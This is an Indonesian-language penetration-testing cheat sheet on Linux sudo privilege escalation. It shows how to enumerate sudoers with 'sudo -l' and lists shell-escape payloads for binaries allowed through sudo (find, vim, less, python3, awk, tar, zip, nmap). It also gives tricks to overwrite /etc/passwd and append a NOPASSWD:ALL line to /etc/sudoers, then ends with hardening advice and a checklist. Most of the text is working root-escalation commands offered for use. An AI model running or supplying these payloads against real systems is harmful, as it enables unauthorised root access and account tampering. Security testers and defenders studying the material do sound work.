# Sudo — Payload Shell Cheat Sheet

> **Tujuan:** Enumerasi permission sudo (sudoers) dan spawn shell dengan privilege root (uid=0) melalui binary yang diizinkan, dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `sudo`, [GTFOBins](https://gtfobins.github.io)

---

## Penjelasan Singkat

**Sudo** memungkinkan user menjalankan command sebagai user lain (umumnya root) sesuai konfigurasi pada `/etc/sudoers`. Jika user diizinkan menjalankan binary yang bisa spawn shell (vim, find, less, python3), maka **privilege escalation ke root** dapat dilakukan.

| Item | Detail |
|------|--------|
| **Cara Deteksi** | `sudo -l` |
| **Ciri Khas** | Entry `(root) NOPASSWD: /path/binary` pada sudoers |
| **Hasil Eksploitasi** | Shell dengan `uid=0(root)` |

---

## Langkah 1: Deteksi & Identifikasi

```bash
# Lihat daftar command yang boleh dijalankan via sudo
sudo -l
```

Contoh output:

```text
User tester may run the following commands on target:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/python3
```

> **Perhatikan:** Entry `NOPASSWD` berarti command dapat dijalankan sebagai root **tanpa password** — langsung dieksploitasi.

---

## Langkah 2: Payload Shell per Binary (GTFOBins → Sudo)

```bash
# find — exec shell sebagai root
sudo find . -name "x" -exec /bin/sh \;

# vim — shell escape dari command mode
sudo vim -c ':!/bin/sh'

# less — shell escape dari pager
sudo less /etc/profile
## lalu ketik: !/bin/sh

# env — jalankan shell via env
sudo env /bin/sh

# python3 — setuid(0) lalu exec shell
sudo python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'

# awk — spawn shell via system()
sudo awk 'BEGIN{system("/bin/sh")}'
```

| Binary | Payload | Catatan |
|--------|---------|---------|
| `find` | `sudo find . -exec /bin/sh \;` | Exec arbitrary command |
| `vim` | `sudo vim -c ':!/bin/sh'` | Shell escape command-mode |
| `less` | `!sh` di dalam pager | Pager shell escape |
| `env` | `sudo env /bin/sh` | Jalankan shell via env |
| `python3` | `sudo python3 -c ...` | Spawn shell via Python |
| `awk` | `sudo awk 'BEGIN{...}'` | Spawn shell via awk |

> **Catatan:** Berbeda dengan SUID, eksploitasi sudo **aman dari dash-drop** karena `ruid=euid=0` saat command dijalankan sebagai root — flag `-p` tidak diperlukan.

---

## Teknik Lanjutan (Jika Binary Tidak Langsung Spawn Shell)

```bash
# Sudo shell escape via GTFOBins sudo - trick tambahan

# cp — overwrite /etc/passwd dengan user baru (hash password kosong)
sudo cp /tmp/passwd_baru /etc/passwd

# tee — inject konfigurasi / sudoers baru
echo 'tester ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers

# tar — exec shell via checkpoint action
sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip — exec shell via -TT
sudo zip /tmp/x.zip x -TT '/bin/sh #'

# ftp / nc / nmap — interactive tool punya escape ke shell
sudo nmap --interactive
nmap> !sh
```

| Binary | Teknik | Catatan |
|--------|---------|---------|
| `cp` | Timpa `/etc/passwd` / `/etc/shadow` | Manipulasi akun |
| `tee` | Append entry sudoers baru | Self-grant sudo penuh |
| `tar` | `--checkpoint-action=exec=/bin/sh` | Exec arbitrary command |
| `zip` | Flag `-TT` | Exec command via test |
| `nmap` | `--interactive` + `!sh` | Mode interaktif lama (v < 7.92) |

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **Bersihkan Entry Sudoers** Hapus entry `NOPASSWD` pada sudoers untuk binary yang bisa spawn shell (vim, find, python3, less, env, awk, tar, zip, nmap).
- **Gunakan Allowlist Ketat** Batasi sudo hanya pada command esensial dengan path absolut dan argumen eksplisit (`user ALL=(root) /usr/bin/systemctl restart apache2`).
- **Hindari Interpreter & Editor** Jangan izinkan interpreter (python, perl, ruby, node) maupun editor/pager (vim, less, awk) via sudo.
- **Aktifkan Logging** Pastikan `sudo` logging (`/var/log/auth.log`) aktif dan dimonitor.

---

## Checklist Penetration Testing Sudo

- [ ] Enumerasi sudo dengan `sudo -l` — perhatikan entry `NOPASSWD`
- [ ] Cek setiap binary di [GTFOBins](https://gtfobins.github.io) → bagian **Sudo**
- [ ] Pilih payload shell yang sesuai dengan binary yang diizinkan
- [ ] Verifikasi dengan `id` → `uid=0(root)`
- [ ] Dokumentasikan temuan dan langkah mitigasi